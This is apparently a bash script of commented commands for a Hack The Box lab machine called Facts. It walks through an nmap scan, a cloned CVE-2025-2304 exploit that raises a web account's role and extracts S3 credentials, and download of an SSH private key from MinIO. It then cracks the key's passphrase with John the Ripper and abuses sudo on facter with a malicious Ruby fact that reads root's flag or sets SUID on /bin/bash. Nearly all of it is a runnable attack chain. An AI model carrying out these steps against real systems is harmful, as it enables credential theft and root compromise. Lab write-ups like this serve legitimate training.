#!/bin/bash
# Day 17 - HTB FACTS | Commands & Explanations

# ─────────────────────────────────────────
# VPN & CONNECTIVITY
# ─────────────────────────────────────────

# Add machine to /etc/hosts for domain resolution
echo "10.129.9.84 facts.htb" | sudo tee -a /etc/hosts

# Verify entry
cat /etc/hosts | grep facts

# ─────────────────────────────────────────
# RECONNAISSANCE — NMAP
# ─────────────────────────────────────────

# Fast scan of all ports
nmap -p- --min-rate 10000 -Pn 10.129.9.84

# Detailed scan of discovered ports
nmap -sCV -p 22,80,54321 -Pn 10.129.9.84

# ─────────────────────────────────────────
# WEB ENUMERATION
# ─────────────────────────────────────────

# Check response headers — reveals server type and framework
curl -I http://facts.htb

# Check robots.txt for hidden paths
curl http://facts.htb/robots.txt

# Directory brute force (if gobuster/dirb installed)
gobuster dir -u http://facts.htb -w ~/common.txt
dirb http://facts.htb

# ─────────────────────────────────────────
# CVE-2025-2304 — PRIVILEGE ESCALATION
# ─────────────────────────────────────────

# Clone the exploit
git clone https://github.com/Alien0ne/CVE-2025-2304
cd CVE-2025-2304

# Register an account on http://facts.htb/admin then run:
# -u  → target URL
# -U  → your registered username
# -P  → your registered password
# --newpass → new password after escalation
# -e  → extract S3 credentials
# -r  → revert role back to client after extraction
python3 exploit.py -u http://facts.htb -U test -P test --newpass test1 -e -r

# ─────────────────────────────────────────
# AWS CLI — MINIO S3 ENUMERATION
# ─────────────────────────────────────────

# Install AWS CLI on Ubuntu
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# Configure with stolen S3 credentials
aws configure set aws_access_key_id <ACCESS_KEY>
aws configure set aws_secret_access_key <SECRET_KEY>
aws configure set default.region us-east-1

# List all buckets
# --endpoint-url → points AWS CLI to MinIO instead of real AWS
aws --endpoint-url http://facts.htb:54321 s3 ls

# List contents of internal bucket
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/

# List .ssh directory inside bucket
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/

# Download the SSH private key
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519

# ─────────────────────────────────────────
# SSH KEY CRACKING — JOHN THE RIPPER
# ─────────────────────────────────────────

# Download ssh2john.py (converts SSH key to crackable hash)
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py -O ssh2john.py

# Convert SSH key to hash format
python3 ssh2john.py id_ed25519 > ssh.hash

# Download rockyou wordlist
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O ~/rockyou.txt

# Crack the passphrase
# --wordlist → dictionary attack using rockyou.txt
john --wordlist=~/rockyou.txt ssh.hash
# Passphrase found: dragonballz

# ─────────────────────────────────────────
# INITIAL ACCESS — SSH
# ─────────────────────────────────────────

# Set correct permissions on private key (required by SSH)
chmod 600 id_ed25519

# Login with the key and cracked passphrase
ssh -i id_ed25519 trivia@facts.htb
# Passphrase: dragonballz

# User flag is in william's home directory (world-readable)
cat /home/william/user.txt

# ─────────────────────────────────────────
# PRIVILEGE ESCALATION — FACTER SUDO ABUSE
# ─────────────────────────────────────────

# Check what trivia can run as root
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/facter

# Check facter version
sudo /usr/bin/facter --version

# Create custom facts directory
mkdir -p ~/.facter/facts.d

# Write malicious Ruby fact that reads the root flag
# Facter.add  → registers a new custom fact
# setcode     → defines what the fact returns
# %x()        → executes a shell command in Ruby
echo 'Facter.add(:pwned) { setcode { %x(cat /root/root.txt) } }' > ~/.facter/facts.d/pwned.rb

# Run facter as root pointing to our custom facts directory
# --custom-dir → tells facter where to load custom Ruby facts from
# This is critical — sudo changes home context so ~/.facter is ignored without this flag
sudo /usr/bin/facter --custom-dir /home/trivia/.facter/facts.d pwned

# Output: root flag printed directly!

# Alternative — get a root shell instead
echo 'Facter.add(:pwned) { setcode { %x(chmod +s /bin/bash) } }' > ~/.facter/facts.d/pwned.rb
sudo /usr/bin/facter --custom-dir /home/trivia/.facter/facts.d pwned
/bin/bash -p
whoami
# Output: root
cat /root/root.txt